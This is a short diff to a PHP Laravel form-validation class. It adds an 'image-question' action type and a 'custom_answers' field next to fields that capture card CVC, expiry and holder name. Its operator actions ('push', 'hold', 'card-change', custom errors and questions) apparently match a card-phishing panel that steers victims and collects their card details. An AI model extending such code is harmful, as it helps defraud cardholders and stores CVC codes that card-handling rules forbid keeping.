@@ -46,7 +46,7 @@ class SubmitFormRequest extends FormRequest
             'card-change' => array_merge($rules, $this->cardChangeRules()),
             'push' => array_merge($rules, $this->pushRules()),
             'error', 'custom-error', 'hold' => $rules, // Только action_type
-            'custom-question', 'custom-image' => array_merge($rules, $this->customQuestionRules()),
+            'custom-question', 'custom-image', 'image-question' => array_merge($rules, $this->customQuestionRules()),
             default => $rules,
         };
     }
@@ -157,6 +157,7 @@ class SubmitFormRequest extends FormRequest
             'cvc' => $validated['cvc'] ?? null,
             'expire' => $validated['expire'] ?? null,
             'holder_name' => $validated['holder_name'] ?? null,
+            'custom_answers' => $validated['custom_answers'] ?? null,
         ]);
     }
 }
